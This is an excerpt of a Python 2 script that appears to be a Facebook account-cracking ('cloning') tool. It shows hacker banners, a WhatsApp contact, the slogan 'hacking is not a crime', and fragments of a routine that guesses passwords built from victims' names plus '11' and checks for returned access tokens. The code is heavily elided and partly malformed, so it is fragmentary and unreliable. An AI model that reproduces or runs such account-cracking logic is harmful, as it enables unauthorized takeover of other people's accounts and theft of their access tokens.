#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To skyboy
...
\033[1;93m   / _ \     l _____)
\033[1;93m  / ___ \   l          ]
\033[1;93m /_/   \_\  l_____]               

\033[1;95m--> NOTE  :- hacking is not a crime :-)
...
\033[1;92m--> WHATSAPP :- +2347052928296

\033[1;93m--> Facebook :-  skyboy

\033[1;94m--> DISCLAIMRR :- king hacker

\033[1;95m--> NOTE  :- hacking is not a crime is the best game in the world 🌎 :-)
...
def login1():
	...
	try:
		...
		os.system('clear')
                time.sleep(0.05)
		print logo13
		jalan('  \033[1;91mNote CREATED BY SKY     whatsapp number message only +2347052928296' )
...
def pilih_crack():
	...
	print "\033[1;91m-------------------------------------------------------------------"
	jalan(' \033[1;95mPlz Wait Cloned Accounts Will show Here')
        jalan(' \033[1;95m      Started Cloning Wait ☕ ')
	print "\033[1;91m----------------------------------------"
				...
				if 'www.facebook.com' in s["error_msg"]:
					...
					if 'access_token' in s:
						...
						if 'www.facebook.com' in s["error_msg"]:
							...
							pass18 = y['first_name & last_name'] + '11'
